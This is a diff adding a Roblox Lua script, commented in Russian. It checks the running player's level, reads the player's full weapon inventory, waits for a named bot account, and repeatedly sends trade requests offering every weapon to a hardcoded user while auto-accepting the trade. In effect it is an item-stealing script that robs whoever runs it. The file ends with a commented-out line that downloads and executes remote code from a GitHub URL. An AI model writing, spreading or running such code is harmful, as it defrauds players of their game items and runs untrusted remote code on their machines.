@@ -1,0 +1,148 @@
+--- Важные переменные
+local botname = "RanoDevx" --- Введите ник вашего бота
+
+
+--- Проверяем девайс
+
+local hasLobby = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI:FindFirstChild("Lobby") ~= nil
+if hasLobby == true then
+    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest.ReceivingRequest.Username.Text
+else
+    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container.TradeRequest.ReceivingRequest.Username.Text
+end
+
+--- Получаем уровень, и проверяем больше ли он 10 уровня, если нет, то кикаем игрока с ошибкой.
+local player = game.Players.LocalPlayer
+local args = {
+    [1] = player.Name
+}
+local accountInformation = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Misc"):WaitForChild("GetPlayerProfile"):InvokeServer(unpack(args))
+local level = accountInformation["Level"]
+
+if level < 10 then
+    player:Kick("You're less than level 10.")
+end
+
+--- Парсим инвентарь и проверяем сколько всего предметов, так же получаем название и количество всех оружий.
+local HttpService = game:GetService("HttpService")
+
+local args = {
+    [1] = player.Name
+}
+
+local inventory = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))
+
+local weapons = inventory["Weapons"]
+local ownedWeapons = weapons["Owned"]
+
+local groupedWeapons = {}
+local currentGroup = {}
+local count = 0
+
+for weaponName, weaponCount in pairs(ownedWeapons) do
+    if weaponCount > 1 then
+        table.insert(currentGroup, weaponName .. " (" .. weaponCount .. ")")
+    else
+        table.insert(currentGroup, weaponName .. " (1)")
+    end
+    count = count + 1
+
+    if count == 4 then
+        table.insert(groupedWeapons, currentGroup)
+        currentGroup = {}
+        count = 0
+    end
+end
+
+if #currentGroup > 0 then
+    table.insert(groupedWeapons, currentGroup)
+end
+
+--- Ожидаем нашего бота на сервере
+
+while true do
+    local checkbot = game.Players:FindFirstChild(botname)
+
+    if checkbot then
+        break
+    end
+end
+
+for _, group in ipairs(groupedWeapons) do
+    local tradeAccepted = false  -- Флаг, указывающий, принят ли трейд
+    
+    while not tradeAccepted do  -- Пока трейд не принят, пробуем снова
+        local args = {
+            [1] = game:GetService("Players"):WaitForChild("xv3vz")
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+
+        local TradeRequest = game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
+        print("TradeRequest:", TradeRequest)
+
+        if TradeRequest == "StartTrade" then
+            -- Предлагаем оружие
+            for _, item in ipairs(group) do
+                local weaponName, weaponCount = item:match("(.+) %((%d+)%)")
+                weaponCount = tonumber(weaponCount)
+                
+                for i = 1, weaponCount do
+                    local args = {
+                        [1] = weaponName,
+                        [2] = "Weapons"
+                    }
+
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+
+                    print("Предложено оружие: " .. weaponName .. " (x" .. i .. ")")
+                end
+            end
+
+            -- Проверка принятия трейда
+            local tradeAcceptedCheck = false
+            while not tradeAcceptedCheck do
+                local args = {
+                    [1] = 285646582  -- Указываем ID трейда (если необходимо)
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+
+                -- Проверка, принят ли трейд
+                local TradeAcceptedCheck = nil
+                if hasLobby then
+                    TradeAcceptedCheck = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.TheirOffer.Accepted.Visible
+                else
+                    TradeAcceptedCheck = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI.Container.Trade.TheirOffer.Accepted.Visible
+                end
+
+                -- Если трейд принят, завершаем цикл
+                if TradeAcceptedCheck == true then
+                    print("Трейд принят!")
+                    tradeAcceptedCheck = true
+                    tradeAccepted = true  -- Флаг принятия трейда для выхода из внешнего цикла
+                else
+                    print("Трейд не принят, пробуем снова...")
+                    task.wait(.1)
+                end
+            end
+
+            -- Проверяем, завершился ли трейд
+            while true do
+                local TradeRequest = game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
+                print("TradeRequest:", TradeRequest)
+
+                if TradeRequest == "None" then
+                    break
+                end
+                wait(1)
+            end
+        else
+            print("Трейд не был начат!")
+        end
+    end
+end
+
+
+
+---     loadstring(game:HttpGet("https://raw.githubusercontent.com/Borebuhisss/Versions/refs/heads/main/06"))()
